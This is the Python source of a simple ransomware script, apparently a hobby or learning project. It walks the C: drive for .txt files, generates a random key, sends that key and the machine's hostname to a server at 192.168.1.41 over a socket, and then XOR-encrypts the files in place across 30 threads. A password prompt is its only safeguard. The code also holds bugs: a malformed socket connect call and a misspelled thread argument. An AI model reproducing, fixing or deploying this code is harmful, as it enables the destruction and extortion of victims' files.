# To change target from Win to linux just change the_path from '\\' to '/' look at 25, 29 line

import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue


# Safeguard password
safeguard = input("Please enter the safeguard password: ")
if safeguard != 'start':
    quit()

# There is format we will use to encrypt all files with this ext
encrypted_ext = ('.txt', )

# take all files
file_paths = []

# Searching disk C and taking all the files with out ext so we starting at C:\\ and going straight to root -> dirs -> and free files on C:\\
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root+'\\'+file)

        # Checking files extentions
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)

# Creating the key
key = ''
encryption_level = 128 // 8
char_pool = ''
for i in range(0x00, 0xFF):
    char_pool += (chr(i))
for i in range(encryption_level):
    key += random.choice(char_pool)

hostname = os.getenv('COMPUTERNAME')

# Access to the server and send the key and hostname
ip_address = '192.168.1.41'
port = 5678
time = datetime.now()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip_address), port)
    s.send(f'[{time}] - {hostname}:{key}'.encode('utf-8'))

# Encrypting files
def encrypt(key):
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = encryption_level - 1
        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1, 'little'))
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1
        except:
            print(f'Failed to encrypt {file}')
        q.task_done()


q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=(key,), deamon=True)
    thread.start()

q.join()
print('Encryption was successful.')